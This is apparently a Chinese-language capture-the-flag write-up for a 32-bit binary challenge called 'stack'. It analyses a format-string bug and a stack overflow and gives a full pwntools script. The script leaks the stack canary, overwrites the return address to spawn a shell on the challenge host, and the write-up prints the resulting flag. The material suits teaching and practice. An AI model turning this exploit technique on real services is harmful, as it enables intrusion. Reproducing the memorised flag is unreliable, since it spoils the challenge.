## 题目信息

- **题目名称**: stack
    
- **分值**: 50
    
- **解决次数**: 2813 solves
    
- **题目地址**: `39.96.193.120:10018`
    
- **附件**: `attachment-5`
    
- **保护情况**:
    
    - Arch: i386-32-little
        
    - RELRO: Partial RELRO
        
    - Stack: Canary found
        
    - NX: NX enabled
        
    - PIE: No PIE (0x8048000)
        
    - Stripped: No
        

## 题目分析

查看主要函数 `vuln`:


```c
unsigned int vuln()
{
  int i;
  char buf[100]; // [esp+8h] [ebp-70h]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]
  v3 = __readgsdword(0x14u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, buf, 512u);
    printf(buf);
  }
  return __readgsdword(0x14u) ^ v3;
}

```

漏洞点有两个：

1. **栈溢出**：`read(0, buf, 512u)`，但 `buf` 只有 100 字节，可覆盖返回地址。
    
2. **格式化字符串**：`printf(buf)` 直接使用用户输入，可以泄露栈上的数据。
    

此外，二进制中存在后门函数 `getshell`:



```c
int getshell()
{
  return system("/bin/sh");
}
```

地址为 `0x080491C6`（由于 PIE 未开启，地址固定）。

利用思路：  
虽然栈溢出可以直接控制返回地址，但存在 Stack Canary 保护。我们需要先通过格式化字符串泄露 Canary 的值，然后在第二次输入时填入正确的 Canary 并覆盖返回地址为后门函数。

## 栈布局分析

- `buf` 位于 `ebp-0x70` (112 字节)
    
- Canary 位于 `ebp-0x0C`
    
- `buf` 到 Canary 的偏移 = 112 - 12 = **100 字节**
    
- 覆盖完 Canary 后还有旧 EBP 和返回地址，需额外填充 12 字节（对齐+旧EBP）再放返回地址。
    

## 漏洞利用步骤

1. **第一次输入**：发送 `%31$p` 泄露 Canary（经测试 Canary 在第 31 个参数位置）。
    
2. **解析 Canary**：接收输出，提取 16 进制数值。
    
3. **第二次输入**：构造 payload = `100 字节填充 + p32(canary) + 12 字节填充 + p32(getshell_addr)`。
    
4. 发送后获得 shell。
    

## 利用脚本 (exp.py)


```python

#!/usr/bin/env python3
from pwn import *
HOST = '39.96.193.120'
PORT = 10018
context.binary = './attachment-5'
context.log_level = 'debug'
GETSHELL_ADDR = 0x080491C6
r = remote(HOST, PORT)
# 第一步：泄露 canary
r.sendline(b'%31$p')
r.recvuntil(b'Hello Hacker!\n')
leak = r.recvline(keepends=False).decode().strip()
log.info(f"Leaked raw: {leak}")
canary = int(leak, 16)
log.success(f"Leaked canary: {hex(canary)}")
# 第二步：构造溢出 payload
offset_to_canary = 100
payload  = b'A' * offset_to_canary
payload += p32(canary)
payload += b'B' * 12          # 填充对齐及旧 ebp
payload += p32(GETSHELL_ADDR)
r.send(payload)
r.interactive()
```

## 运行结果

text

```
[+] Opening connection to 39.96.193.120 on port 10018: Done
[*] Leaked raw: 0x140a7c00
[+] Leaked canary: 0x140a7c00
[*] Switching to interactive mode
ISCC{e8c874b2-8cd2-4921-8d80-899157acd562}
```

## Flag

**ISCC{e8c874b2-8cd2-4921-8d80-899157acd562}**